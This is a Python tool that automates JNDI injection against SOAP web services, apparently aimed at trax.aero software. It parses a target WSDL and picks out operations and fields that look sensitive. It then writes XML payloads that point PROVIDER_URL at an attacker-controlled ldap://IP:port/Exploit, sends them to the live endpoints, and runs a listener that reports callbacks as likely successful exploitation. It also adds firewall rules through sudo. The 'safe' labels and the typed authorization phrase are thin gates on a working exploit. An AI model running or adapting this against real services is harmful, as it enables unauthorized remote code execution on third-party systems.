#!/usr/bin/env python3
"""
wsdl_auto_exploit.py

Safe automation for WSDL reconnaissance + JNDI probe (LDAP callback probe).
- Dry-run by default (parses WSDL, enumerates ops, writes payload XML files named after service).
- Active probe only with --exploit and explicit confirmation phrase (default: "I HAVE AUTHORIZATION").
- Will optionally start a TCP listener on chosen IP:port and report if a connection occurs.
- Will check sudo ufw status (if available) to help you validate egress/ingress rules.

Requirements:
  pip install zeep requests lxml

Usage examples (dry-run only):
  python wsdl_auto_exploit.py --wsdl https://host/service?wsdl --outdir ./payloads

To perform active probes:
  python wsdl_auto_exploit.py --wsdl ... --outdir ./payloads --exploit --listener --listen-port 1389

"""

import argparse
import os
import socket
import subprocess
import threading
import time
from http import client
from pathlib import Path
from typing import Dict, List

import requests
from zeep import Client, Settings
from zeep.plugins import HistoryPlugin
from zeep.transports import Transport

COMMON_PORTS = [1389, 8080, 8443, 80, 443, 53, 123, 587, 3306, 5000, 7001, 9999]

def start_multiple_tcp_listeners(bind_ip: str, ports: list, timeout: int = 30):
    """Start TCP listeners on multiple ports concurrently. Returns dict with results."""
    results = {}
    threads = []

    def listener_worker(port):
        result = {"port": port, "accepted": False, "peer": None, "error": None}
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((bind_ip, port))
                s.listen(1)
                s.settimeout(timeout)
                try:
                    conn, addr = s.accept()
                    result["accepted"] = True
                    result["peer"] = addr
                    try:
                        conn.settimeout(2)
                        _ = conn.recv(1024)
                    except Exception:
                        pass
                    conn.close()
                except socket.timeout:
                    pass
        except Exception as e:
            result["error"] = str(e)
        results[port] = result

    for p in ports:
        t = threading.Thread(target=listener_worker, args=(p,), daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join(timeout + 2)

    return results

# ---- Config / Suspicious items to look for ----
SUSPICIOUS_OP_KEYWORDS = ("set", "create", "update", "configure", "init", "start", "stop")
SUSPICIOUS_FIELD_KEYWORDS = [
    "password", "passwd", "credential", "secret", "token", "key", "username", "user", "admin",
    "provider_url", "providerurl", "initial_context_factory", "security_credentials",
    "security_principal", "PROVIDER_URL", "SECURITY_CREDENTIALS", "SECURITY_PRINCIPAL",
    "connectionfactory", "connection_factory", "destinationname", "customprocessor", "customreader",
    "customwriter", "msgSource"
]

# ---- Utility functions ----
def get_local_ip() -> str:
    """Return the primary local IP address used to reach the internet (best-effort)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # connect to a public DNS IP, doesn't send packets
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def ensure_ufw_port_allowed(port: int) -> bool:
    try:
        r = subprocess.run(["sudo", "ufw", "status"], capture_output=True, text=True)
        output = r.stdout.lower()
        if f"{port}" in output and "allow" in output:
            return True
        # Add rule
        subprocess.run(["sudo", "ufw", "allow", f"{port}/tcp"], check=True)
        return True
    except Exception as e:
        print(f"[!] Could not verify/add ufw rule for port {port}: {e}")
        return False

def cleanup_ufw_ports(ports: List[int]):
    for port in ports:
        try:
            subprocess.run(["sudo", "ufw", "delete", "allow", f"{port}/tcp"], check=True)
            print(f"[+] Removed ufw rule for port {port}")
        except Exception:
            pass

def check_ufw_status() -> str:
    """Try to run 'sudo ufw status' to show firewall settings (requires sudo)."""
    try:
        p = subprocess.run(["sudo", "ufw", "status"], capture_output=True, text=True, timeout=10)
        return p.stdout.strip() if p.returncode == 0 else f"ufw returned code {p.returncode}: {p.stdout.strip()} {p.stderr.strip()}"
    except Exception as e:
        return f"ufw check failed: {e}"

def save_payload(filename: Path, xml: str):
    filename.parent.mkdir(parents=True, exist_ok=True)
    filename.write_text(xml, encoding="utf-8")
    print(f"[+] Wrote payload: {filename}")

# ---- Zeep client loader with simple timeout handling ----
def load_wsdl(wsdl_url: str, timeout=15, verify=True):
    session = requests.Session()
    session.verify = verify
    transport = Transport(session=session, timeout=timeout)
    settings = Settings(strict=False, xml_huge_tree=True)
    history = HistoryPlugin()
    client = Client(wsdl=wsdl_url, transport=transport, settings=settings, plugins=[history])
    return client, history

# ---- Recon & payload generation ----
def recon_wsdl(wsdl_url: str):
    """Parse WSDL and return a dict with services, ports, operations, suspicious fields."""
    client, history = load_wsdl(wsdl_url)
    services = {}
    suspicious_fields = set()
    encoded_style = False

    # gather services/ports/operations and detect encoded style usage in raw WSDL if possible
    try:
        raw = requests.get(wsdl_url, timeout=10, verify=wsdl_url.startswith("https")).text
        if "http://schemas.xmlsoap.org/soap/encoding/" in raw:
            encoded_style = True
    except Exception:
        raw = None

    for sname, serv in client.wsdl.services.items():
        services[sname] = {}
        for pname, port in serv.ports.items():
            ops = list(port.binding._operations.keys())
            services[sname][pname] = {
                "address": port.binding_options.get("address"),
                "binding": str(port.binding.name),
                "operations": ops
            }

    # attempt to discover suspicious element/field names via client.wsdl.types
    try:
        schema = client.wsdl.types
        # elements: try both .elements and generator/list forms
        elems = []
        if hasattr(schema, "elements"):
            try:
                if hasattr(schema.elements, "items"):
                    elems = [k for k, v in schema.elements.items()]
                else:
                    elems = list(schema.elements)
            except Exception:
                elems = []
        for e in elems:
            name = getattr(e, "localname", str(e)).lower() if hasattr(e, "localname") or isinstance(e, tuple) else str(e).lower()
            for kw in SUSPICIOUS_FIELD_KEYWORDS:
                if kw.lower() in name:
                    suspicious_fields.add(name)
    except Exception:
        # fallback: nothing
        pass

    return {
        "services": services,
        "suspicious_fields": sorted(suspicious_fields),
        "encoded_style": encoded_style
    }

def build_jndi_probe_xml(service_name: str, operation: str, target_ip: str, target_port: int, namespace="http://source.trax.aero"):
    root_tag = operation
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="{namespace}">
  <soapenv:Body>
    <ns:{root_tag}>
      <jmsConfig xmlns="http://JMS.castor.trax.aero">
        <INITIAL_CONTEXT_FACTORY>com.sun.jndi.ldap.LdapCtxFactory</INITIAL_CONTEXT_FACTORY>
        <PROVIDER_URL>ldap://{target_ip}:{target_port}/Exploit</PROVIDER_URL>
        <SECURITY_PRINCIPAL>probe</SECURITY_PRINCIPAL>
        <SECURITY_CREDENTIALS>probe</SECURITY_CREDENTIALS>
        <valid>true</valid>
      </jmsConfig>
    </ns:{root_tag}>
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml

# ---- Active network functions ----
def start_tcp_listener(bind_ip: str, bind_port: int, timeout: int = 30):

    result = {"conn": None, "peer": None, "accepted": False}

    def _listener():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((bind_ip, bind_port))
                s.listen(1)
                s.settimeout(timeout)
                try:
                    conn, addr = s.accept()
                    result["conn"] = conn
                    result["peer"] = addr
                    result["accepted"] = True
                    # try to read small amount then close
                    try:
                        conn.settimeout(2)
                        _ = conn.recv(1024)
                    except Exception:
                        pass
                    try:
                        conn.close()
                    except Exception:
                        pass
                except socket.timeout:
                    pass
        except Exception as e:
            result["error"] = str(e)

    t = threading.Thread(target=_listener, daemon=True)
    t.start()
    return t, result

def send_soap_payload(url: str, xml: str, timeout=15, verify=True):

    headers = {
        "Content-Type": "text/xml",
        "SOAPAction": '""'
    }
    try:
        r = requests.post(url, data=xml.encode("utf-8"), headers=headers, timeout=timeout, verify=verify)
        status = r.status_code
        body = r.text[:2000]

        if "Fault" in body or status >= 400:
            verdict = "Rejected by Service (SOAP Fault or HTTP error)"
        elif 200 <= status < 300:
            verdict = "Possibly Accepted / Executed"
        else:
            verdict = "Unknown or Unhandled HTTP Status"

        return {
            "status_code": status,
            "text": body,
            "headers": dict(r.headers),
            "verdict": verdict
        }

    except Exception as e:
        return {
            "error": str(e),
            "verdict": "Dropped or No Response"
        }

def main():
    ap = argparse.ArgumentParser(description="Automate WSDL recon and safe JNDI probe (LDAP callback) creation/sending.")
    ap.add_argument("--wsdl", required=True, help="WSDL URL")
    ap.add_argument("--outdir", default="payloads", help="Directory to write payload XML files")
    ap.add_argument("--exploit", action="store_true", help="Enable active exploit/probe sending (requires interactive confirmation)")
    ap.add_argument("--recon", action="store_true", help="Recon-only mode: assess potential risk without sending traffic")
    ap.add_argument("--listener", action="store_true", help="Start a TCP listener on specified --listen-port to detect callbacks")
    ap.add_argument("--listen-ip", default=None, help="IP to bind the listener to (defaults to auto-detected public/private IP)")
    ap.add_argument("--listen-port", type=int, default=1389, help="Port to listen on for callback (default 1389)")
    ap.add_argument("--timeout", type=int, default=30, help="Listener timeout seconds")
    ap.add_argument("--no-verify-tls", action="store_true", help="Do not verify TLS when sending SOAP requests")
    ap.add_argument("--all-ops", action="store_true", help="Treat all WSDL operations as interesting (override filters)")
    args = ap.parse_args()

    wsdl = args.wsdl
    outdir = Path(args.outdir)
    verify_tls = not args.no_verify_tls

    print(f"[+] Reconnaissance: parsing WSDL {wsdl}")
    recon = recon_wsdl(wsdl)
    services = recon["services"]
    print(f"[+] Found services: {list(services.keys())}")
    for sname, ports in services.items():
        for pname, pinfo in ports.items():
            print(f"  - Service: {sname} / Port: {pname}")
            print(f"    Address: {pinfo.get('address')}")
            print(f"    Operations: {pinfo.get('operations')}")

    if recon["suspicious_fields"]:
        print(f"[!] Suspicious fields discovered: {recon['suspicious_fields']}")
    if recon["encoded_style"]:
        print("[!] WSDL indicates encoded/RPC style usage (higher risk)")

    local_ip = args.listen_ip if args.listen_ip else get_local_ip()
    listen_port = args.listen_port
    print(f"[+] Default listener IP: {local_ip}, port: {listen_port}")

    # If only recon requested
    if args.recon:
        if recon["encoded_style"] or recon["suspicious_fields"]:
            print("\n[+] Recon-only mode active. Target WSDL appears POTENTIALLY VULNERABLE due to:")
            if recon["encoded_style"]:
                print("  - Use of SOAP encoded style (RPC/encoded), often associated with insecure parsers.")
            if recon["suspicious_fields"]:
                print("  - Field names matching sensitive or JNDI-related patterns.")
        else:
            print("\n[+] Recon-only mode active. No immediate signs of unsafe operations or encoded SOAP style.")
        return

    # Generate payloads
    outdir.mkdir(parents=True, exist_ok=True)
    generated = []
    for sname, ports in services.items():
        safe_sname = sname.replace(" ", "_").replace("/", "_")
        for pname, pinfo in ports.items():
            for op in pinfo.get("operations", []):
                lower = op.lower()
                is_interesting = (
                    any(k in lower for k in SUSPICIOUS_OP_KEYWORDS)
                    or "jms" in lower or "flatfile" in lower or "timer" in lower
                )
                if not (args.all_ops or is_interesting):
                    continue
                xml = build_jndi_probe_xml(safe_sname, op, local_ip, listen_port)
                fname = outdir / f"{safe_sname}_{op}.xml"
                save_payload(fname, xml)
                generated.append((op, fname, pinfo.get("address")))

    if not generated:
        print("[+] No interesting operations found. Exiting.")
        return

    print(f"[+] Generated {len(generated)} probe payload(s) in {outdir}")

    if not args.exploit:
        print("[+] Dry-run complete. Use --exploit to run active probes (requires confirmation).")
        return

    auth_phrase = "I HAVE AUTHORIZATION"
    print("\n*** ACTIVE MODE ENABLED ***")
    print("You must have explicit written authorization to run active probes.")
    resp = input(f"Type the authorization phrase exactly to proceed: [{auth_phrase}]\n> ").strip()
    if resp != auth_phrase:
        print("[!] Authorization phrase mismatch. Aborting active probes.")
        return

    print("[*] Checking ufw status (may prompt for sudo)...")
    ufw = check_ufw_status()
    print("[*] ufw status / output:")
    print(ufw)

    listener_thread = None
    listener_result = None
    if args.listener:
        print(f"[+] Starting TCP listener on {local_ip}:{listen_port} for {args.timeout}s ...")
        t, res = start_tcp_listener(local_ip, listen_port, timeout=args.timeout)
        listener_thread = t
        listener_result = res
        time.sleep(0.5)

    final_report = []
    for op, fname, address in generated:
        xml = fname.read_text(encoding="utf-8")
        target_url = address if address else wsdl
        print(f"[+] Sending probe for op {op} -> {target_url} (payload {fname.name})")
        r = send_soap_payload(target_url, xml, verify=verify_tls)
        verdict = r.get("verdict", "No verdict")
        print(f"    [{verdict}] - Status: {r.get('status_code', r.get('error'))}")
        if "text" in r:
            print("    Body (truncated):", r["text"][:300].replace("\n", " "))
        final_report.append({
            "operation": op,
            "target": target_url,
            "payload": str(fname),
            "verdict": verdict,
            "status": r.get("status_code", r.get("error"))
        })

    if listener_thread:
        print(f"[+] Waiting {args.timeout}s for listener to capture callbacks...")
        listener_thread.join(timeout=args.timeout + 1)
        if listener_result and listener_result.get("accepted"):
            peer = listener_result.get("peer")
            print(f"[!] Callback received from {peer} â€” exploit may have executed.")
            final_report.append({
                "listener_port": listen_port,
                "callback_received": True,
                "peer": peer
            })
        else:
            print("[+] No callback received. May indicate blocked egress or server ignored payload.")
            final_report.append({
                "listener_port": listen_port,
                "callback_received": False
            })

    print("\n=== Summary Report ===")
    for item in final_report:
        print(item)

    print("\nDone.")

if __name__ == "__main__":
    main()
